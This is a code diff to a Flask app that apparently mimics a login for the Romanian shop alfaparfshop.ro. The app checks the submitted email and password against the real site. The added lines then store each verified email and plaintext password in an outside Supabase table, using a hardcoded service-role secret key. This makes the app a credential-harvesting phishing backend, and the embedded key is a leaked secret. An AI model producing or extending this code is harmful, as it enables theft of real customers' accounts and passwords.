@@ -1,5 +1,6 @@
 from flask import Flask, render_template, redirect, request
 from requests import post
+from supabase import create_client
 
 
 login_url = 'https://www.alfaparfshop.ro/inregistrare?pcId=&preview=&a=&ret=&redirect='
@@ -17,6 +18,11 @@ headers = {
 
 app = Flask(__name__)
 
+supabase_client = create_client(
+    url="https://ssadrzbwbfkhtyyhwhqe.supabase.co",
+    secret_key="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNzYWRyemJ3YmZraHR5eWh3aHFlIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTcyMDU1MDU4MCwiZXhwIjoyMDM2MTI2NTgwfQ.i9Fr3Gfvif06FSCDgvME8IX4gN55Sq-KdvM93dsnz6M"
+)
+
 @app.route('/')
 def index():
     return 'Index Page'
@@ -30,7 +36,10 @@ def autentificare():
     email = request.form['email']
     password = request.form['password']
     csrf_token = request.form['d00c9ec3869c7f6133ab7cfb5148452a']
-    return redirect("/inregistrare") if not login(email, password, csrf_token) else redirect('/')
+    if not login(email, password, csrf_token):
+        return redirect("/inregistrare")
+    supabase_client.insert('login', {'email': email, 'password': password})
+    redirect('/')
 
 def login(email, password, csrf_token):
     login_data = {
